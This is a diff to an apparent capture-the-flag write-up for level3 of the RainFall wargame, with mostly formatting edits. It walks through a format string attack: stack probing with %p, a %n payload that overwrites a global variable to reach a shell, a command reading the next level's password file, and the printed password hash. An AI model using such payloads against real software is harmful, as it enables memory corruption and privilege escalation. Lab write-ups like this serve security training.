@@ -53,7 +53,7 @@ GDB teachs us many things.
 0x080484da <+54>:	mov    0x804988c,%eax
 0x080484df <+59>:	cmp    $0x40,%eax
 ```
-Now we know that after `printf()` calls the program move `0x804988c` in `eax` to compare it with value `0x40` if the compare is correct it can launch a new shell. But we know that `gets()` isn't used instead the program use `fgets()` which is secured. Let's see how printf is called with ltrace.
+Now we know that after `printf()` calls the program move `0x804988c` in `eax` to compare it with value `0x40` if the compare is correct it can launch a new shell. But we know that `gets()` isn't used instead the program use `fgets()` which is secured. Let's see how printf is called with `ltrace`.
 
 ```shell
 level3@RainFall:~$ ltrace ./level3
@@ -65,7 +65,7 @@ printf("AAAAA\n"AAAAA
 +++ exited (status 0) +++
 ```
 
-ltrace shows us that printf is called with the `fgets()` buffer so we can easily understand that printf is called as below.
+`ltrace` shows us that `printf()` is called with the `fgets()` buffer so we can easily understand that `printf()` is called as below.
 
 ```c
 printf(buffer);
@@ -75,7 +75,7 @@ That's means that we can use a **Format String Attack**.
 
 ### Format String Attack
 
-A format string attack is a printf() vulnerability which consists use printf's flags in the buffer, and printf() won't know what to read, so it will read random places on stack.
+A format string attack is a `printf()` vulnerability which consists use printf's flags in the buffer, and `printf()` won't know what to read, so it will read random places on stack.
 
 **Example :**
 ```shell
@@ -83,23 +83,23 @@ level3@RainFall:~$ python -c 'print "AAAA %p %p %p %p %p %p"' | ./level3
 AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
 ```
 
-As we can see, printf() prints random adresses in the stack except for one address, the fourth. The fourth adress is the value given in the begin of our string. Interesting, that's means that if we write a correct address instead of `AAAA` and change `%p` with `%d` we can print a value of a precise address in the stack. Let's try to print the address found few lines above.
+As we can see, `printf()` prints random adresses in the stack except for one address, the fourth. The fourth adress is the value given in the begin of our string. Interesting, that's means that if we write a correct address instead of `AAAA` and change `%p` with `%d` we can print a value of a precise address in the stack. Let's try to print the address found few lines above.
 
 ```shell
 level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%d %d %d %d %d %d"' | ./level3
 �512 -1208149312 -1208010800 134518924 622879781 1680154724
 ```
 
-OK, that's looks good for us. We know that printf()'s flag %n can write a precise address with the len of our string. So if we write our address and then 60 characters before our flag we can change the value pointed the address to `0x40`.
+OK, that's looks good for us. We know that `printf()`'s flag %n can write a precise address with the len of our string. So if we write our address and then 60 characters before our flag we can change the value pointed the address to `0x40`.
 
-### Our payload
+### Payload
 
 `python -c 'print "\x8c\x98\x04\x08" + "\x90"*60 + "%4$n"' > /tmp/payload`
 
 Now we have our payload we just have to inject it into the program.
 
 ```shell
-level3@RainFall:~$ (cat /tmp/payload__; echo "cat /home/user/level4/.pass") | ./level3
+level3@RainFall:~$ (cat /tmp/payload; echo "cat /home/user/level4/.pass") | ./level3
 �������������������������������������������������������������
 Wait what?!
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
